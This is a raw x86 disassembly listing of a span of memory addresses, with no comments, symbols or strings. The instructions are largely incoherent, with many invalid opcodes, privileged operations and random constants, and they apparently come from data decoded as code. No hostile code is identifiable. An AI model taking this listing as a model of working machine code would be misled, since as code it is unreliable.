  429663:	jge    0x429650
  429665:	imul   BYTE PTR [edx+0x0]
  429668:	add    BYTE PTR [eax],al
  42966a:	add    BYTE PTR [eax],al
  42966c:	dec    eax
  42966d:	test   DWORD PTR [ebp-0x913ab6e],eax
  429673:	push   eax
  429674:	iret   
  429675:	mov    edi,0x851c6af6
  42967a:	mov    ch,0x60
  42967c:	xor    ebp,esp
  42967e:	test   BYTE PTR [ebx+0x37b3decf],0xe2
  429685:	jmp    0x42960b
  429687:	shl    BYTE PTR [edx+0x15],0x83
  42968b:	(bad)  
  42968c:	dec    esp
  42968d:	pop    esi
  42968e:	mov    bl,0xcd
  429690:	dec    edi
  429691:	push   es
  429692:	lea    eax,[ebp-0x909f4]
  429698:	lods   al,BYTE PTR ds:[esi]
  429699:	ficomp WORD PTR [esi+0x30]
  42969c:	bnd jmp 0x429623
  42969f:	rcl    bl,0x7c
  4296a2:	rol    BYTE PTR [esp+ecx*1+0x1c33085e],0x61
  4296aa:	mov    BYTE PTR [ebp-0x90a24],al
  4296b0:	inc    edi
  4296b1:	xor    eax,0x5b7513b3
  4296b6:	dec    DWORD PTR [eax+edi*8-0x5504cce5]
  4296bd:	mov    edi,DWORD PTR [eax]
  4296bf:	ror    DWORD PTR [edi],cl
  4296c1:	push   edi
  4296c2:	add    BYTE PTR [ebp-0x4c70c19],0x25
  4296c9:	inc    ecx
  4296ca:	dec    DWORD PTR [eax+eax*1+0xbf8ccb]
  4296d1:	add    BYTE PTR [eax],al
  4296d3:	add    BYTE PTR [eax],al
  4296d5:	lea    eax,[ebp-0x61850610]
  4296db:	inc    ebx
  4296dc:	jp     0x42966e
  4296de:	mov    al,ds:0xdbdd503d
  4296e3:	dec    eax
  4296e4:	aas    
  4296e5:	jne    0x429685
  4296e7:	jp     0x4296e1
  4296e9:	pop    esp
  4296ea:	xor    al,0x38
  4296ec:	push   eax
  4296ed:	pop    ebp
  4296ee:	push   edx
  4296ef:	out    dx,eax
  4296f0:	stc    
  4296f1:	dec    edx
  4296f2:	sahf   
  4296f3:	ds or  ebp,eax
  4296f6:	pop    edx
  4296f7:	jnp    0x4296b9
  4296f9:	shl    BYTE PTR [edx],0xf4
  4296fc:	mov    edi,0xf879a29b
  429701:	sub    al,0x44
  429703:	cmp    BYTE PTR [ebp-0x4c9bd08],cl
  429709:	sbb    cl,BYTE PTR [ebx]
  42970b:	cmp    ebx,edx
  42970d:	adc    dh,BYTE PTR [esi]
  42970f:	jmp    0x4296e4
  429711:	mov    dh,0x1b
  429713:	test   BYTE PTR ds:0xffc45e9d,cl
  429719:	je     0x4296af
  42971b:	or     dh,ah
  42971d:	test   ebx,ebx
  42971f:	add    esp,DWORD PTR [ecx-0x3b7053]
  429725:	lahf   
  429726:	pop    eax
  429727:	stos   DWORD PTR es:[edi],eax
  429728:	pop    es
  429729:	inc    esi
  42972a:	or     edi,DWORD PTR [ecx]
  42972c:	adc    eax,0xffbf4895
  429731:	rol    BYTE PTR [ecx],cl
  429733:	imul   esi,DWORD PTR [ebx-0x41],0x2c
  429737:	ins    BYTE PTR es:[edi],dx
  429738:	xchg   BYTE PTR [eax],al
  42973a:	add    BYTE PTR [eax],al
  42973c:	add    BYTE PTR [eax],al
  42973e:	jne    0x42976e
  429740:	push   edx
  429741:	cmp    BYTE PTR [ebp-0x51c735c7],bl
  429747:	jle    0x4297bd
  429749:	cmp    ebx,DWORD PTR [esp+ebp*1-0x5327d4c6]
  429750:	xor    DWORD PTR [eax],edi
  429752:	sbb    edx,DWORD PTR [esi]
  429754:	pop    esp
  429755:	jle    0x429712
  429757:	sub    DWORD PTR [edx],esp
  429759:	cmp    BYTE PTR ds:0x86e898,ah
  42975f:	jp     0x4297bf
  429761:	inc    esp
  429762:	pop    ebp
  429763:	dec    esp
  429764:	sar    DWORD PTR [ecx],cl
  429766:	outs   dx,BYTE PTR ds:[esi]
  429767:	xchg   BYTE PTR [ecx],ch
  429769:	mov    ecx,0x5b747d8d
  42976e:	sbb    eax,0x7503e975
  429773:	sbb    cl,dl
  429775:	push   es
  429776:	jne    0x42977a
  429778:	je     0x42973b
  42977a:	cli    
  42977b:	shr    BYTE PTR [ebp+0x3e],cl
  42977e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42977f:	jge    0x4297ed
  429781:	cmp    al,0x29
  429783:	sub    al,0xca
  429785:	aam    0x12
  429787:	test   DWORD PTR [edx],edx
  429789:	ss push ds
  42978b:	xchg   BYTE PTR [ecx+0x6d430007],ch
  429791:	inc    esp
  429792:	mov    cl,bh
  429794:	cmc    
  429795:	inc    ebx
  429796:	xchg   edi,eax
  429797:	jns    0x429805
  429799:	cmp    al,0x9
  42979b:	sub    al,0x9a
  42979d:	mov    eax,esi
  42979f:	sub    bl,BYTE PTR [ebp+0x37]
  4297a5:	add    BYTE PTR [eax],al
  4297a7:	out    dx,al
  4297a8:	rol    BYTE PTR [eax],cl
  4297aa:	add    eax,0x37690275
  4297af:	mov    BYTE PTR [esi+0x78dac3d6],cl
  4297b5:	add    BYTE PTR [esi+ebx*8-0x216bfea],bh
  4297bc:	test   eax,esi
  4297be:	popa   
  4297bf:	mov    ah,BYTE PTR [edi]
  4297c1:	push   eax
  4297c2:	ins    BYTE PTR es:[edi],dx
  4297c3:	hlt    
  4297c4:	add    bh,ah
  4297c6:	push   esi
  4297c7:	push   0xffffffd2
  4297c9:	cli    
  4297ca:	aaa    
  4297cb:	cld    
  4297cc:	test   DWORD PTR [eax],ecx
  4297ce:	inc    edi
  4297cf:	push   0x27
  4297d1:	push   eax
  4297d2:	ins    BYTE PTR es:[edi],dx
  4297d3:	hlt    
  4297d4:	sub    bh,cl
  4297d6:	ss dec edx
  4297d8:	sar    dl,cl
  4297da:	pop    ss
  4297db:	cld    
  4297dc:	ins    DWORD PTR es:[edi],dx
  4297dd:	adc    BYTE PTR [esi],ah
  4297df:	dec    edx
  4297e0:	daa    
  4297e1:	mov    eax,0x27182
  4297e6:	add    DWORD PTR ds:0xfde8fff7,ebp
  4297ec:	test   BYTE PTR [eax],cl
  4297ee:	pop    es
  4297ef:	stos   BYTE PTR es:[edi],al
  4297f0:	daa    
  4297f1:	push   eax
  4297f2:	ins    BYTE PTR es:[edi],dx
  4297f3:	hlt    
  4297f4:	xor    eax,edi
  4297f6:	test   BYTE PTR [ebx+0x79648cd2],0x28
  4297fd:	sti    
  4297fe:	out    0x26,al
  429800:	jle    0x429787
  429802:	fnstcw WORD PTR [esi+0x27]
  429805:	sti    
  429806:	cmp    esi,edi
  429808:	ds push eax
  42980a:	mov    es,WORD PTR [eax]
  42980c:	add    BYTE PTR [eax],al
  42980e:	add    BYTE PTR [eax],al
  429810:	(bad)  
  429812:	(bad)  
  429813:	call   0xb9c30d05
  429818:	arpl   WORD PTR [edi],sp
  42981a:	call   0xfb6bcef9
  42981f:	push   0x4a
  429821:	push   ss
  429822:	test   DWORD PTR [ecx-0x5878fd38],ebp
  429828:	and    ebx,DWORD PTR es:[ecx+0x3927aa03]
  42982f:	in     al,dx
  429830:	out    dx,al
  429831:	dec    esi
  429832:	aas    
  429833:	add    ah,cl
  429835:	jno    0x42983a
  429837:	push   0xffffffcc
  429839:	repz adc al,0x18
  42983c:	lods   eax,DWORD PTR ds:[esi]
  42983d:	ds sti 
  42983f:	mov    eax,0x64a
  429844:	dec    ecx
  429845:	add    BYTE PTR [eax],0xf7
  429848:	sbb    esi,esp
  42984a:	mov    ebp,0x483e9c00
  42984f:	jne    0x429896
  429851:	push   esp
  429852:	pop    ecx
  429853:	mov    al,0x8d
  429855:	inc    edi
  429856:	enter  0x2c3,0x3c
  42985a:	cmp    al,0x21
  42985d:	hlt    
  42985e:	je     0x429868
  429860:	adc    eax,ecx
  429862:	jae    0x42989e
  429864:	lods   eax,DWORD PTR ds:[esi]
  429865:	jmp    edx
  429867:	ss adc eax,ecx
  42986a:	jae    0x4298a2
  42986c:	fldcw  WORD PTR [eax-0x3]
  42986f:	test   BYTE PTR [ecx+ebx*2+0xe826],bl
  429876:	add    BYTE PTR [eax],al
  429878:	add    BYTE PTR [ebx+0x1c],dh
  42987b:	stc    
  42987c:	jmp    edi
  42987e:	cmc    
  42987f:	test   dh,dh
  429881:	ror    BYTE PTR [ecx+0x63],1
  429884:	xor    cl,al
  429886:	add    eax,0x6ac75700
  42988b:	pop    ds
  42988c:	adc    al,0x82
  42988e:	(bad)  
  42988f:	je     0x429908
  429891:	dec    ebx
  429892:	lock add eax,0xffffffc1
  429896:	cld    
  429897:	dec    ebp
  429898:	call   0x3bb4d3
  42989d:	push   ds
  42989e:	(bad)  
  42989f:	loop   0x4298c1
  4298a1:	xchg   ebp,eax
  4298a2:	xor    ebp,DWORD PTR [ebx+0x680d3701]
  4298a8:	xor    BYTE PTR [ecx-0x2],ah
  4298ab:	call   DWORD PTR [esi-0x25]
  4298ae:	jb     0x4298cf
  4298b0:	adc    al,0x75
  4298b2:	and    DWORD PTR [ebx+esi*2],0xffffffea
  4298b6:	js     0x429933
  4298b8:	xlat   BYTE PTR ds:[ebx]
  4298b9:	out    dx,eax
  4298ba:	jae    0x4298c1
  4298bc:	xchg   ebp,eax
  4298bd:	mov    ch,0xa9
  4298bf:	dec    ebx
  4298c0:	push   ds
  4298c1:	mov    ah,0x10
  4298c3:	sar    BYTE PTR [ebp-0x7935e48f],cl
  4298c9:	rcr    DWORD PTR [edi+eiz*1+0x346f618],1
  4298d0:	add    BYTE PTR [ebx],bl
  4298d2:	mov    ds:0x5efde5aa,al
  4298d7:	and    esi,DWORD PTR [ebp+0x6f]
  4298da:	push   ebp
  4298db:	cli    
  4298dc:	push   edi
  4298dd:	add    BYTE PTR [eax],al
  4298df:	add    BYTE PTR [eax],al
  4298e1:	add    BYTE PTR [ebx],dl
  4298e3:	mov    dl,0xba
  4298e5:	out    0x25,eax
  4298e7:	les    ecx,FWORD PTR [esi+eiz*2]
  4298ea:	pusha  
  4298eb:	xchg   ebx,eax
  4298ec:	test   eax,0x386820f
  4298f1:	(bad)  
  4298f2:	in     al,dx
  4298f3:	pop    esi
  4298f4:	daa    
  4298f5:	lea    edi,[eax+0x4ee7d3fe]
  4298fb:	inc    esp
  4298fc:	xor    eax,0x8246cffb
  429901:	inc    ebp
  429902:	dec    ebp
  429903:	mov    esi,DWORD PTR [esi*2+0x7344037d]
  42990a:	dec    edx
  42990b:	sbb    BYTE PTR [ebx-0x40],bh
  42990e:	leave  
  42990f:	(bad)  
  429910:	cdq    
  429911:	test   BYTE PTR [ebx-0x31],al
  429914:	adc    BYTE PTR [ebx],cl
  429916:	jmp    0x342b:0xa0facf58
  42991d:	jne    0x42998c
  42991f:	push   ebx
  429920:	addr16 jae 0x42993d
  429923:	push   0x1689c07b
  429928:	lock mov edi,0x2f0144b5
  42992e:	xor    eax,0x6941b002
  429933:	add    dh,BYTE PTR [ecx+ecx*4]
  429936:	loope  0x4298bc
  429938:	lea    edi,[ebx]
  42993a:	push   0x16
  42993c:	add    eax,0x824bfbd1
  429941:	shr    BYTE PTR [esi-0x7e],0xfe
  429945:	or     eax,DWORD PTR [eax]
  429947:	add    BYTE PTR [eax],al
  429949:	add    BYTE PTR [eax],al
  42994b:	je     0x4299ca
  42994d:	or     BYTE PTR es:[edi],ah
  429950:	rcr    DWORD PTR [ebp+0x32],1
  429953:	dec    eax
  429954:	mul    DWORD PTR [ebp+0x3b]
  429957:	push   ecx
  429958:	mov    al,0xf0
  42995a:	test   eax,0x233fd0b0
  42995f:	jne    0x429963
  429961:	jmp    0xc5ba080f
  429966:	fistp  QWORD PTR [edx-0x36]
  429969:	push   eax
  42996a:	adc    edi,DWORD PTR [edx+0x2]
  42996d:	jmp    0x99838d3f
  429972:	test   eax,0xaf73c940
  429977:	push   esi
  429978:	repnz adc BYTE PTR ds:0xda1228af,bh
  42997f:	int    0x7d
  429981:	sub    DWORD PTR [edx+edi*2+0x4dc328f3],esi
  429988:	jno    0x429973
  42998a:	add    esi,DWORD PTR [ebp-0xd]
  42998d:	icebp  
  42998e:	mov    ebx,0xdfa575a7
  429993:	mov    ss,edx
  429995:	adc    eax,0x4bee83a
  42999a:	call   0xe8a01361
  42999f:	push   edx
  4299a0:	jns    0x4299f7
  4299a2:	call   0xe88012f5
  4299a7:	dec    edx
  4299a8:	sbb    dl,BYTE PTR [edx+ebx*4+0xe]
  4299ac:	sub    BYTE PTR [eax],al
  4299ae:	ins    DWORD PTR es:[edi],dx
  4299af:	add    BYTE PTR [eax],al
  4299b1:	add    BYTE PTR [eax],al
  4299b3:	add    BYTE PTR [ecx+0x65054475],dh
  4299b9:	sti    
  4299ba:	sub    DWORD PTR [ebx+0x71],0x2
  4299be:	add    BYTE PTR [esi+0x2d8cb7ea],bl
  4299c4:	fisttp QWORD PTR [ebx]
  4299c6:	call   0xfb6e9778
  4299cb:	ins    DWORD PTR es:[edi],dx
  4299cc:	xor    DWORD PTR [esi-0x1bf28197],ebp
  4299d2:	adc    esp,DWORD PTR [edx-0x43]
  4299d5:	jecxz  0x4299f2
  4299d7:	cmp    DWORD PTR [edx],0x9866fafd
  4299dd:	ret    
  4299de:	and    eax,DWORD PTR [ecx]
  4299e0:	mov    ds:0x2bb97a41,al
  4299e5:	mov    esi,0xd700f123
  4299ea:	sbb    ebp,DWORD PTR cs:[eax+0x2f02f134]
  4299f1:	lods   eax,DWORD PTR ds:[esi]
  4299f2:	inc    eax
  4299f3:	pusha  
  4299f4:	int    0xe3
  4299f6:	pslld  mm5,QWORD PTR [esp+esi*4]
  4299fa:	sbb    esi,DWORD PTR [edx-0x3b]
  4299fd:	jecxz  0x429a12
  4299ff:	jb     0x4299aa
  429a01:	sub    ebp,DWORD PTR [edi-0x13]
  429a04:	mov    ds,WORD PTR [edi+eax*8+0xf]
  429a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a09:	jle    0x4299cb
  429a0b:	jge    0x429a7f
  429a0d:	sub    eax,DWORD PTR [ebp+eax*8+0x66]
  429a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a12:	ret    0x34c4
  429a15:	scas   al,BYTE PTR es:[edi]
  429a16:	in     eax,0xee
  429a18:	add    BYTE PTR [eax],al
  429a1a:	add    BYTE PTR [eax],al
  429a1c:	add    BYTE PTR [edx],cl
  429a1e:	jecxz  0x429a33
  429a20:	sar    DWORD PTR [ecx-0xa210620],1
  429a26:	mov    ebp,0x228ef523
  429a2b:	mov    cs,esi
  429a2d:	xlat   BYTE PTR ds:[bx]
  429a2f:	mov    edi,0x1f6a7500
  429a34:	adc    BYTE PTR [ebx],ah
  429a36:	pop    eax
  429a38:	jmp    0x429a62
  429a3a:	hlt    
  429a3b:	jae    0x429a61
  429a3d:	sub    BYTE PTR [ebx],cl
  429a3f:	ins    BYTE PTR es:[edi],dx
  429a40:	sub    dl,dl
  429a42:	repz mov WORD PTR [eax+edi*4-0xa],es
  429a47:	out    0xc3,eax
  429a49:	outs   dx,BYTE PTR ds:[esi]
  429a4a:	hlt    
  429a4b:	test   BYTE PTR [ebx+0x5b59541b],0x67
  429a52:	ficomp DWORD PTR [ebx+eax*8+0x69]
  429a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a57:	jmp    0x4299da
  429a59:	lock add DWORD PTR cs:[eax],eax
  429a5d:	int3   
  429a5e:	dec    edi
  429a5f:	sub    bl,bl
  429a61:	cli    
  429a62:	dec    ebx
  429a63:	mov    BYTE PTR [ebp+0x3c],bl
  429a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a67:	pop    esp
  429a68:	in     al,0x15
  429a6a:	push   edx
  429a6b:	jmp    0x4299f6
  429a6d:	shr    esi,1
  429a6f:	mov    BYTE PTR [ebp+0x48],bl
  429a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a73:	pop    esp
  429a74:	enter  0x5205,0xcf
  429a78:	cmp    ebx,DWORD PTR [edi+0x6f]
  429a7b:	dec    ecx
  429a7c:	mov    cr1,edx
  429a7f:	add    BYTE PTR [eax],al
  429a81:	add    BYTE PTR [eax],al
  429a83:	add    BYTE PTR [eax],al
  429a85:	add    BYTE PTR [edi+edi*2+0xc1202f8],cl
  429a8c:	jnp    0x429a86
  429a8e:	pop    edi
  429a8f:	add    DWORD PTR [ebp+0x24c87],eax
  429a95:	(bad)  
  429a96:	fldenv ds:0x94c458c
  429a9c:	std    
  429a9d:	leave  
  429a9e:	inc    edx
  429a9f:	hlt    
  429aa0:	loop   0x429b1c
  429aa2:	xlat   BYTE PTR ds:[ebx]
  429aa3:	inc    edx
  429aa4:	add    ecx,DWORD PTR [ebx-0x767d057b]
  429aaa:	mov    al,ds:0x75000001
  429aaf:	cwde   
  429ab0:	sub    edi,esi
  429ab2:	jae    0x429a63
  429ab4:	inc    ebx
  429ab5:	mov    BYTE PTR [eax-0x1eba8559],dh
  429abb:	or     edi,DWORD PTR [ebx+0x55]
  429abe:	add    eax,0xd14d770b
  429ac3:	mov    ds:0xbeecafd2,al
  429ac8:	imul   ebp,eax,0xffffff9e
  429acb:	pop    es
  429acc:	add    al,0x0
  429ace:	(bad)  
  429ad0:	jp     0x429a8f
  429ad2:	lds    edx,FWORD PTR [edx-0x243204cf]
  429ad8:	pop    es
  429ad9:	sti    
  429ada:	rcl    BYTE PTR [esi-0x5330d896],cl
  429ae0:	xor    bl,al
  429ae2:	cmp    BYTE PTR [ebx+0x1b750018],al
  429ae8:	jp     0x429a9f
  429aea:	add    BYTE PTR [eax],al
  429aec:	add    BYTE PTR [eax],al
  429aee:	add    BYTE PTR [ecx],ah
  429af0:	les    esi,FWORD PTR [eax]
  429af2:	sti    
  429af3:	popf   
  429af4:	inc    esp
  429af5:	inc    ecx
  429af6:	cli    
  429af7:	mov    ds:0xb386fe41,al
  429afc:	scas   al,BYTE PTR es:[edi]
  429afd:	mov    edx,0x3d359def
  429b02:	cli    
  429b03:	mov    bl,BYTE PTR [eax-0x797dd2b8]
  429b09:	pop    ss
  429b0a:	jne    0x429aa0
  429b0c:	xchg   ebx,eax
  429b0d:	lahf   
  429b0e:	add    al,0x75
  429b10:	sbb    edi,DWORD PTR [edx-0x7b]
  429b13:	inc    ebp
  429b14:	adc    dh,BYTE PTR [ecx]
  429b16:	sti    
  429b17:	(bad)  
  429b18:	imul   esi,DWORD PTR [eax],0x15
  429b1b:	mov    ch,0x45
  429b1d:	mov    edi,0xffdef7ff
  429b22:	gs je  0x429ac3
  429b25:	ret    0xa5ef
  429b28:	mov    al,ds:0x1ee07c2
  429b2d:	inc    ecx
  429b2e:	or     BYTE PTR ds:0x75042d3e,bl
  429b34:	icebp  
  429b35:	(bad)  
  429b37:	test   eax,0xc70d542e
  429b3c:	sbb    bh,BYTE PTR [edi]
  429b3e:	fisttp DWORD PTR [eiz*1+0x1a1ab6ba]
  429b45:	aaa    
  429b46:	(bad)  
  429b48:	and    al,0x13
  429b4a:	sbb    al,0x89
  429b4c:	(bad)  [edx-0x6fbd5cd0]
  429b52:	pop    eax
  429b53:	add    BYTE PTR [eax],al
  429b55:	add    BYTE PTR [eax],al
  429b57:	add    bl,ch
  429b59:	and    al,0xe9
  429b5b:	jp     0x429bc5
  429b5d:	inc    esi
  429b5e:	pusha  
  429b5f:	mov    dh,0xce
  429b61:	sbb    DWORD PTR [ebx+0x3e],edx
  429b64:	iret   
  429b65:	and    al,0x70
  429b67:	(bad)  
  429b68:	push   cs
  429b69:	xor    esp,0x243c7427
  429b6f:	xor    DWORD PTR [ebp-0x59],esi
  429b72:	jmp    0x429bf0
  429b74:	cmp    BYTE PTR [esi],ch
  429b76:	dec    esi
  429b77:	add    al,0x13
  429b79:	cld    
  429b7a:	mov    al,0x7a
  429b7c:	cmp    BYTE PTR [edx+0x60],dl
  429b7f:	mov    dh,0x92
  429b81:	jmp    0x5a8:0x747e37bb
  429b88:	jne    0x429b8c
  429b8a:	pop    esi
  429b8b:	into   
  429b8c:	mov    ds,WORD PTR [eax-0x3913e8f3]
  429b92:	inc    eax
  429b93:	jp     0x429b7d
  429b95:	ss loopne 0x429b4e
  429b98:	cmp    dh,ah
  429b9a:	(bad)  
  429b9b:	fbld   TBYTE PTR [eax+0x24]
  429b9e:	jmp    0x6e3d4c1f
  429ba3:	ret    
  429ba4:	jbe    0x429bc0
  429ba6:	dec    eax
  429ba7:	mov    esi,0x6d00244a
  429bac:	mov    dh,0xf7
  429bae:	adc    eax,0x70
  429bb1:	add    al,BYTE PTR [eax]
  429bb3:	jb     0x429b99
  429bb5:	aaa    
  429bb6:	call   FWORD PTR [ebx+0x61]
  429bb9:	jns    0x429c30
  429bbb:	rol    DWORD PTR [eax],1
  429bbd:	add    BYTE PTR [eax],al
  429bbf:	add    BYTE PTR [eax],al
  429bc1:	mov    al,ds:0xdc10a3a5
  429bc6:	pop    ss
  429bc7:	jb     0x429bd7
  429bc9:	mov    gs,WORD PTR [ebp+0x756d53db]
  429bcf:	inc    ebx
  429bd0:	loope  0x429bfa
  429bd2:	mov    ah,0xfa
  429bd4:	aam    0x32
  429bd6:	adc    al,BYTE PTR [eax-0x17]
  429bd9:	idiv   DWORD PTR [esi]
  429bdb:	or     al,0x64
  429bdd:	xor    DWORD PTR [esi+0x2bac9609],ebp
  429be3:	xchg   DWORD PTR [ecx+ecx*4],esp
  429be6:	mov    ds:0xbedfddc1,eax
  429beb:	jmp    0x429be8
  429bed:	cmp    bl,dl
  429bef:	icebp  
  429bf0:	bound  ebp,QWORD PTR [edi+edx*1-0x876dbc7]
  429bf7:	test   BYTE PTR [ebx],ch
  429bf9:	js     0x429bfd
  429bfb:	add    BYTE PTR [ebx+eax*1],bl
  429bfe:	add    eax,DWORD PTR [eax]
  429c00:	jmp    0xe90840a8
  429c05:	jbe    0x429c09
  429c07:	lea    esi,[edx+0x1d75756a]
  429c0d:	imul   edx,DWORD PTR [ebx+eiz*1],0xc07e5237
  429c14:	mov    ch,0x68
  429c16:	pushf  
  429c17:	adc    esi,DWORD PTR [edx+edi*1-0x5]
  429c1b:	dec    edi
  429c1c:	jb     0x429c5a
  429c1e:	inc    edi
  429c1f:	jmp    FWORD PTR [ecx]
  429c21:	dec    ecx
  429c22:	sub    BYTE PTR ds:0xcd,dl
  429c28:	add    BYTE PTR [eax],al
  429c2a:	add    dl,0xff
  429c2d:	(bad)  
  429c2e:	fistp  QWORD PTR [edx+0x311ff0b]
  429c34:	jnp    0x429bf9
  429c36:	and    BYTE PTR [esi+0x3399d85c],ah
  429c3c:	add    edx,DWORD PTR [ebx-0x57]
  429c3f:	push   0xffffffdb
  429c41:	mov    DWORD PTR [ecx-0x3a],ebp
  429c44:	out    0x5a,eax
  429c46:	xlat   BYTE PTR ds:[ebx]
  429c47:	aam    0xf6
  429c49:	test   esp,ecx
  429c4b:	and    ecx,DWORD PTR [eax-0xe292]
  429c51:	push   edx
  429c52:	and    al,0x2
  429c54:	int    0xfe
  429c56:	retf   
  429c57:	jp     0x429c19
  429c59:	setno  BYTE PTR [edi+0x0]
  429c5d:	add    ah,bl
  429c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c60:	mov    esi,0xc9071a8b
  429c65:	(bad)  
  429c66:	or     dl,ah
  429c68:	add    eax,0xffffffbb
  429c6b:	jns    0x429cb4
  429c6d:	add    esp,ebx
  429c6f:	(bad)  
  429c70:	jp     0x429cbf
  429c72:	sbb    al,0xd4
  429c74:	jp     0x429cf3
  429c76:	lock xor BYTE PTR [edi+0x15],dh
  429c7a:	dec    ebx
  429c7b:	push   0xffffffb7
  429c7d:	mov    ebx,DWORD PTR [edi+0x7]
  429c80:	(bad)
  429c83:	aam    0x88
  429c85:	inc    ebp
  429c86:	dec    esp
  429c87:	jp     0x429c49
  429c89:	unpcklps xmm5,XMMWORD PTR [edi]
  429c8c:	add    BYTE PTR [eax],al
  429c8e:	add    BYTE PTR [eax],al
  429c90:	add    BYTE PTR [eax],al
  429c92:	add    BYTE PTR [edi+eiz*4+0x3f070844],bl
  429c99:	dec    DWORD PTR [edx+0x17efc]
  429c9f:	mov    ebx,ss
  429ca1:	dec    esp
  429ca2:	rol    BYTE PTR [esi],1
  429ca4:	cli    
  429ca5:	mov    WORD PTR [ebp-0x1c],es
  429ca8:	xor    al,0x4b
  429caa:	push   DWORD PTR [ebp+0x1e]
  429cad:	jmp    0x429cc0
  429caf:	mov    ch,0x2b
  429cb1:	jle    0x429c77
  429cb3:	xor    DWORD PTR [ebp+0x4],0xc7ae7d66
  429cba:	fwait
  429cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429cbc:	add    ecx,DWORD PTR [ebp-0xf]
  429cbf:	cmp    dh,BYTE PTR [ecx]
  429cc1:	cwde   
  429cc2:	add    BYTE PTR [edi-0x2ba84f9],bl
  429cc8:	fist   DWORD PTR [ebp-0x66d47301]
  429cce:	std    
  429ccf:	out    dx,eax
  429cd0:	push   0x2b8b671c
  429cd5:	inc    DWORD PTR [esi+0xb48a72d]
  429cdb:	stc    
  429cdc:	dec    esi
  429cdd:	add    al,0x0
  429cdf:	jne    0x429ca4
  429ce1:	mov    esi,DWORD PTR [esi]
  429ce3:	jne    0x429d10
  429ce5:	sub    al,0x32
  429ce7:	fld    QWORD PTR [ebx-0x44]
  429cea:	jmp    edx
  429cec:	mov    ds:0x73f6f7c2,al
  429cf1:	(bad)  
  429cf2:	jl     0x429c75
  429cf4:	xchg   esp,eax
  429cf5:	xor    al,ch
  429cf7:	add    BYTE PTR [eax],al
  429cf9:	add    BYTE PTR [eax],al
  429cfb:	add    ah,ah
  429cfd:	sub    bh,bh
  429cff:	(bad)  
  429d00:	out    dx,al
  429d01:	out    dx,al
  429d02:	sub    esp,edi
  429d04:	push   esi
  429d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d06:	mov    eax,0xf6afe6f
  429d0b:	test   DWORD PTR [ebp-0x54d0fcca],esi
  429d11:	les    eax,FWORD PTR [eax]
  429d13:	lea    esp,ds:0x9b19171f
  429d19:	enter  0xb2c,0xc2
  429d1d:	jmp    0x429ca1
  429d1f:	repnz or DWORD PTR [edi],edx
  429d22:	cdq    
  429d23:	sub    al,0x46
  429d25:	std    
  429d26:	(bad)  
  429d27:	repnz add ch,BYTE PTR fs:[edx+edx*2-0x20]
  429d2d:	shr    ecx,cl
  429d2f:	je     0x429d66
  429d31:	aad    0x1f
  429d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d34:	mov    ds:0xfbe4964a,eax
  429d39:	pop    ds
  429d3a:	jo     0x429d03
  429d3c:	inc    edx
  429d3d:	(bad)  
  429d3e:	xor    al,0xf8
  429d40:	aas    
  429d41:	and    edx,esi
  429d43:	sbb    esi,DWORD PTR [eax-0x64d314b2]
  429d49:	add    ebp,DWORD PTR [esi+0x45]
  429d4c:	clc    
  429d4d:	into   
  429d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d4f:	sbb    esp,DWORD PTR [ecx+0x4a]
  429d52:	shr    DWORD PTR [edx+ebx*4],cl
  429d55:	dec    ecx
  429d56:	cld    
  429d57:	sub    al,0xc0
  429d59:	sbb    bh,BYTE PTR [ebx+eiz*1]
  429d5c:	repnz sahf 
  429d5e:	test   BYTE PTR [eax+0x0],bh
  429d61:	add    BYTE PTR [eax],al
  429d63:	add    BYTE PTR [eax],al
  429d65:	adc    ch,BYTE PTR [edx]
  429d67:	add    eax,0xf6027505
  429d6c:	inc    ebx
  429d6d:	xor    eax,0xa3c59ad5
  429d72:	dec    eax
  429d73:	sbb    eax,0xe0c6fbc9
  429d78:	js     0x429da7
  429d7a:	push   es
  429d7b:	pop    esi
  429d7c:	jp     0x429d73
  429d7e:	add    ch,cl
  429d80:	add    esp,DWORD PTR [edi]
  429d82:	mov    ecx,0xfdcd456d
  429d87:	push   eax
  429d88:	sub    eax,0x441c8cbe
  429d8d:	cli    
  429d8e:	dec    eax
  429d8f:	ins    BYTE PTR es:[edi],dx
  429d90:	cmp    ch,BYTE PTR [ecx*1+0x22307eb3]
  429d97:	inc    ecx
  429d98:	sub    dh,BYTE PTR [esi+0x7d184a1f]
  429d9e:	(bad)  
  429d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429da0:	and    ebx,DWORD PTR [ebp+0x7e2d30a6]
  429da6:	test   DWORD PTR [eax],eax
  429da8:	sub    edx,eax
  429daa:	loop   0x429d32
  429dac:	mov    ah,0x72
  429dae:	inc    edx
  429daf:	inc    ebp
  429db0:	es ja  0x429d38
  429db3:	repnz xchg ebp,eax
  429db5:	bound  ebx,QWORD PTR ds:0x137e4175
  429dbb:	leave  
  429dbc:	pop    fs
  429dbe:	test   eax,eax
  429dc0:	or     BYTE PTR [ecx-0x71],0x4d
  429dc4:	or     DWORD PTR [esi+0x7a],ebx
  429dc7:	(bad)
  429dca:	add    BYTE PTR [eax],al
  429dcc:	add    BYTE PTR [eax],al
  429dce:	mov    ds,WORD PTR [edi+0x1b76dd64]
  429dd4:	inc    ebp
  429dd5:	mov    ebp,0x1ad7bdaa
  429dda:	sbb    eax,DWORD PTR [di-0x3f]
  429dde:	call   0x384c:0x346ae7c5
  429de5:	add    dh,BYTE PTR [esp+edx*1]
  429de8:	or     ebp,DWORD PTR [ebp+0x42]
  429deb:	sbb    eax,0x954eb6fb
  429df0:	out    dx,eax
  429df1:	ror    DWORD PTR [esp+eiz*8-0x4a955907],0xbb
  429df9:	jb     0x429daf
  429dfb:	inc    edi
  429dfc:	xchg   DWORD PTR [esi*1+0x4c555589],esp
  429e03:	mov    ch,0xb3
  429e05:	sbb    ebp,ecx
  429e07:	and    eax,0xa8792836
  429e0c:	aaa    
  429e0d:	sbb    DWORD PTR [eax+0x30794d8a],esp
